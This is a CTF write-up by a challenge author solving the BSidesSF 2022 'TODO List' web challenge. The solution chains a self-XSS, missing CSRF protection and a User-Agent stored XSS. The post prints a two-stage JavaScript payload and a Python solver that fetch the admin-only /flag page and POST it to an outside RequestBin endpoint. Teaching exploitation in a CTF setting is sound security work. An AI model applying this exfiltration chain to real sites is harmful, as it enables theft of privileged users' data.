---
layout: post
title: "BSidesSF 2022 CTF: TODO List"
category: Security
tags:
  - BSidesSF
  - CTF
date: 2022-06-09
---

This year, I was the author of a few of our web challenges.  One of those that
gave both us (as administrators) and the players a few difficulties was "TODO
List".

Upon visiting the application, we see an app with a few options, including
registering, login, and support.  Upon registering, we are presented with an
opportunity to add TODOs and mark them as finished:

![Add TODOs](/img/bsidessf/todolist_todos.png)

If we check `robots.txt` we discover a couple of interesting entries:

```
User-agent: *
Disallow: /index.py
Disallow: /flag
```

Visiting `/flag`, unsurprisingly, shows us an "Access Denied" error and nothing
further.  It seems that we'll need to find some way to elevate our privileges or
compromise a privileged user.

The other entry, `/index.py`, provides the source code of the TODO List app.  A
few interesting routes jump out at us, not least of which is the routing for
`/flag`:

```python
@app.route('/flag', methods=['GET'])
@login_required
def flag():
    user = User.get_current()
    if not (user and user.is_admin):
        return 'Access Denied', 403
    return flask.send_file(
            'flag.txt', mimetype='text/plain', as_attachment=True)
```

We see that we will need a user flagged with `is_admin`.  There's no obvious way
to set this value on an account.  User IDs as stored in the database are based
on a sha256 hash, and the passwords are hashed with argon2.  There's no obvious
way to login as an administrator here.  There's an endpoint labeled `/api/sso`,
but it requires an existing session.

Looking at the frontend of the application, we see a pretty simple Javascript to
load TODOs from the API, add them to the UI, and handle marking them as finished
on click.  Most of it looks pretty reasonable, but there's a case where the
TODO is inserted into an HTML string here:

```js
const rowData = `<td><input type='checkbox'></td><td>${data[k].text}</td>`;
const row = document.createElement('tr');
row.innerHTML = rowData;
```

This looks *awfully* like an XSS sink, unless the server is pre-escaping the
data for us in the API.  Easy enough to test though, we can just add a TODO
containing `<span onclick='alert(1)'>Foobar</span>`.  We quickly see the span
become part of the DOM and a click on it gets the alert we're looking for.

![TODOs](/img/bsidessf/todolist_todo_alert.png)

At this point, we're only able to get an XSS on ourselves, otherwise known as a
"Self-XSS". This isn't very exciting by itself -- running a script as ourselves
is not crossing any privilege boundaries.  Maybe we can find a way to create a
TODO for another user?

```python
@app.route('/api/todos', methods=['POST'])
@login_required
def api_todos_post():
    user = User.get_current()
    if not user:
        return '{}'
    todo = flask.request.form.get("todo")
    if not todo:
        return 'Missing TODO', 400
    num = user.add_todo(todo)
    if num:
        return {'{}'.format(num): todo}
    return 'Too many TODOs', 428
```

Looking at the code for creating a TODO, it seems quite clear that it depends on
the current user.  The TODOs are stored in Redis as a single hash object per
user, so there's no apparent way to trick it into storing a TODO for someone
else.  It is worth noting that there's no apparent protection against a
[Cross-Site Request Forgery](https://owasp.org/www-community/attacks/csrf), but
it's not clear how we could perform such an attack against the administrator.

Maybe it's time to take a look at the Support site.  If we visit it, we see not
much at all but a Login page.  Clicking on Login redirects us through the
`/api/sso` endpoint we saw before, passing a token in the URL and generating a
new session cookie on the support page.  Unlike the main TODO app, no source
code is to be found here.  In fact, the only real functionality is a page to
"Message Support".

Submitting a message to support, we get a link to view our own message.  In the
page, we have our username, our IP, our User-Agent, and our message.  Maybe we
can use this for something.  Placing an XSS payload in our message doesn't seem
to get anywhere in particular -- nothing is firing, at least when we preview it.
Obviously an IP address isn't going to contain a payload either, but we still
have the username and the User-Agent.  The User-Agent is relatively easily
controlled, so we can try something here.  cURL is an easy way to give it a try,
especially if we use the developer tools to copy our initial request for
modification:

```
curl 'https://todolist-support-ebc7039e.challenges.bsidessf.net/message' \
  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryz4kbBFNL12fwuZ57' \
  -H 'cookie: sup_session=75b212f8-c8e6-49c3-a469-cfc369632c72' \
  -H 'origin: https://todolist-support-ebc7039e.challenges.bsidessf.net' \
  -H 'referer: https://todolist-support-ebc7039e.challenges.bsidessf.net/message' \
  -H 'user-agent: <script>alert(1)</script>' \
  --data-raw $'------WebKitFormBoundaryz4kbBFNL12fwuZ57\r\nContent-Disposition: form-data; name="difficulty"\r\n\r\n4\r\n------WebKitFormBoundaryz4kbBFNL12fwuZ57\r\nContent-Disposition: form-data; name="message"\r\n\r\nfoobar\r\n------WebKitFormBoundaryz4kbBFNL12fwuZ57\r\nContent-Disposition: form-data; name="pow"\r\n\r\n1b4849930f5af9171a90fe689edd6d27\r\n------WebKitFormBoundaryz4kbBFNL12fwuZ57--\r\n'
```

Viewing this message, we see our good friend, the alert box.

![Alert 1](/img/bsidessf/todolist_support_alert_1.png)

Things are beginning to become a bit clear now -- we've discovered a few things.

1. The flag is likely on the page `/flag` of the TODO list manager.
2. Creating a TODO list entry has no protection against XSRF.
3. Rendering a TODO is vulnerable to a self-XSS.
4. Messaging the admin via support appears to be vulnerable to XSS in the User-Agent.

Due to the [Same-Origin
Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy),
the XSS on the support site can't directly read the resources from the main TODO
list page, so we need to do a bit more here.

We can chain these together to (hopefully) retrieve the flag as the admin by
sending a message to the admin that contains a User-Agent with an XSS payload
that does the following steps:

1. Uses the XSRF to inject a payload (steps 3+) as a new XSS.
2. Redirects the admin to their TODO list to trigger the XSS payload.
3. Uses the Fetch API (or XHR) to retrieve the flag from `/flag`.
4. Uses the Fetch API (or XHR) to send the flag off to an endpoint we control.

One additional complication is that `<script>` tags will not be executed if
injected via the `innerHTML` mechanism in the TODO list.  The reasons are
complicated, but essentially:

- `innerHTML` is parsed using the algorithm descripted in [Parsing HTML
  Fragments](https://html.spec.whatwg.org/multipage/parsing.html#html-fragment-parsing-algorithm)
  of the HTML spec.
- This creates an HTML parser associated with a **new** Document node.
- The script node is parsed by this parser, and then inserted into the DOM of
  the parent Document.
- Consequently, the parser document and the element document are different,
  [preventing
  execution](https://www.w3.org/TR/2011/WD-html5-20110405/scripting-1.html#execute-the-script-block).

We can work around this by using an event handler that will fire asynchronously.
My favorite variant of this is doing something like `<img src='x'
onerror='alert(1)'>`.

I began by preparing the payload I wanted to fire on `todolist-support` as an
HTML standalone document.  I included a couple of variables for the hostnames
involved.

{% raw %}
```html
<div id='s2'>
const dest='{{dest}}';
fetch('/flag').then(r => r.text()).then(b => fetch(dest, {method: 'POST', body: b}));
</div>
<script>
const ep='{{ep}}';
const s2=document.getElementById('s2').innerHTML;
const fd=new FormData();
fd.set('todo', '<img src="x" onerror="'+s2+'">');
fetch(ep+'/api/todos',
    {method: 'POST', body: fd, mode: 'no-cors', credentials: 'include'}).then(
        _ => {document.location.href = ep + '/todos'});
</script>
```
{% endraw %}

I used the DIV `s2` to get the escaping right for the Javascript I wanted to
insert into the error handler for the image.  This would be the payload executed
on `todolist`, while the lower `script` tag would be executed on
`todolist-support`.  This wasn't strictly necessary, but it made experimenting
with the 2nd stage payload easier.

The `todolist-support` payload triggers a cross-origin request (hence the need
for `mode: 'no-cors'` and `credentials: 'include'` to the `todolist` API to
create a new TODO.  The new TODO contained an image tag with the contents of
`s2` as the `onerror` handler (which would fire as soon as rendered).

That javascript first fetched the `/flag` endpoint, then did a `POST` to my
destination with the contents of the response.

I built a small(ish) python script to send the payload file, and used
[RequestBin](https://requestbin.com/) to receive the final flag.

{% raw %}
```python
import requests
import argparse
import os


def make_email():
    return os.urandom(12).hex() + '@example.dev'


def register_account(session, server):
    resp = session.post(server + '/register', data={
        'email': make_email(),
        'password': 'foofoo',
        'password2': 'foofoo'})
    resp.raise_for_status()


def get_support(session, server):
    resp = session.get(server + '/support')
    resp.raise_for_status()
    return resp.url


def post_support_message(session, support_url, payload):
    # first sso
    resp = session.get(support_url + '/message')
    resp.raise_for_status()
    msg = "auto-solution-test"
    pow_value = "c8157e80ff474182f6ece337effe4962"
    data = {"message": msg, "pow": pow_value}
    resp = session.post(support_url + '/message', data=data,
            headers={'User-Agent': payload})
    resp.raise_for_status()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--requestbin',
            default='https://eo3krwoqalopeel.m.pipedream.net')
    parser.add_argument('server', default='http://localhost:3123/',
            nargs='?', help='TODO Server')
    args = parser.parse_args()

    server = args.server
    if server.endswith('/'):
        server = server[:-1]
    sess = requests.Session()
    register_account(sess, server)
    support_url = get_support(sess, server)
    if support_url.endswith('/'):
        support_url = support_url[:-1]
    print('Support URL: ', support_url)
    payload = open('payload.html').read().replace('\n', ' ')
    payload = payload.replace('{{dest}}', args.requestbin
            ).replace('{{ep}}', server)
    print('Payload is: ', payload)
    post_support_message(sess, support_url, payload)
    print('Sent support message.')


if __name__ == '__main__':
    main()
```
{% endraw %}

The python takes care of registering an account, redirecting to the support
site, logging in there, then sending the payload in the User-Agent header.
Checking the request bin will (after a handful of seconds) show us the flag.
